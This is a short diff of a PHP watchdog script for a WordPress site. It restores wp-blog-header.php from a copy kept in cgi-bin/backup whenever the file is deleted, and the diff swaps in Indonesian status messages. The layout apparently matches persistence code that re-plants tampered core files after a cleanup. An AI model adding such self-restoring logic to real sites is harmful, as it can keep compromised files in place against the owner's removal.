@@ -1,13 +1,13 @@
 <?php
 $file = '/home/he109633/aislacastilla.com/wp-blog-header.php';
-$backup = '/home/he109633/aislacastilla.com/cgi-bin/backup.php';
+$backup = '/home/he109633/aislacastilla.com/cgi-bin/backup/wp-blog-header.php';
 
-// file cek
+// Cek apakah file telah dihapus
 if (!file_exists($file)) {
     // Jika file dihapus, kembalikan dari backup
     copy($backup, $file);
-    echo "/home/he109633/aislacastilla.com/cgi-bin/backup.php";
+    echo "File .php telah dihapus, tapi sudah dikembalikan dari backup.";
 } else {
-    echo "/home/he109633/aislacastilla.com/wp-blog-header.php";
+    echo "File .php aman.";
 }
 ?>
